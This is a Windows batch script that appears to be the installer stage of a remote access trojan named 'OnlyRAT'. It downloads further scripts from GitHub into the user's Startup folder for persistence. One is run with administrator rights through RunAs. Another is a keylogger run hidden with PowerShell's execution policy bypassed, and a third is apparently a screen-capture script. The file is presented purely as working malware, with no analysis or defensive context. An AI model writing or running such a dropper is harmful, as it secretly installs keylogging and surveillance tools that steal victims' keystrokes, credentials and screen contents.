@echo off

set "initialPath=%cd%"

set "startup=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

cd /d "%startup%"


powershell -c "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/admin/admin.bat', '%startup%\admin.bat')"
powershell -c "Start-Process cmd.exe -ArgumentList '/c \"%startup%\admin.bat\"' -Verb RunAs"


echo powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/keylogg.ps1' -OutFile 'keylogg.ps1'; Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File \"%startup%\keylogg.ps1\"' -WindowStyle Hidden" > down.cmd


powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\down.cmd\"' -WindowStyle Hidden"

powershell -c "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/ss.ps1', '%startup%\ss.ps1')"
powershell -Command "Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File \"%startup%\ss.ps1\"' -WindowStyle Hidden"

cd /d "%initialPath%"


REM del initial.cmd
